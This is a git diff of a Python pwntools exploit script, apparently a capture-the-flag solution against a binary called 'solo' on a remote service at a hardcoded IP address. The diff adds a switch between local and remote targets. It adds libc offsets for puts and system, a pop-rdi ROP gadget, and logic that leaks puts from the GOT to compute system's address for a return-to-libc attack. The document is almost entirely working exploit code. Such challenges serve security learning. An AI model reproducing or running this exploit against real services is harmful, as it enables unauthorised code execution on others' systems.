@@ -3,9 +3,12 @@
 from pwn import *
 
 DEBUG = True
+MODE = "LOCAL"
 
-p = remote("52.175.144.148", 9901)
-#p = process("./solo")
+if MODE == "LOCAL":
+  p = remote("localhost", 12250)
+else:
+  p = remote("52.175.144.148", 9901)
 
 def r(msg):
   response = p.recvuntil(msg)
@@ -51,9 +54,17 @@ SIZE = 0x60
 puts_plt = 0x400600
 puts_got = 0x602020
 
+# Remote
 poprdi_ret = 0x400d13
-puts_offset = 0x6fd60
-system_offset = 0x46590
+
+if MODE == "LOCAL":
+  puts_offset = 0x6f690
+  system_offset = 0x45390
+else:
+  puts_offset = 0x6fd60
+  system_offset = 0x46590
+
+# Local
 
 main_start = 0x400680
 
@@ -81,7 +92,8 @@ exploit(payload2)
 
 leak = r("\x7f")[1:].ljust(8, '\0')
 puts_addr = u64(leak)
-system_addr = puts_addr - puts_offset + system_offset
+#system_addr = puts_addr - puts_offset + system_offset
+system_addr = puts_addr - 0x2a300
 
 print "puts: %x" % puts_addr
 print "system: %x" % system_addr
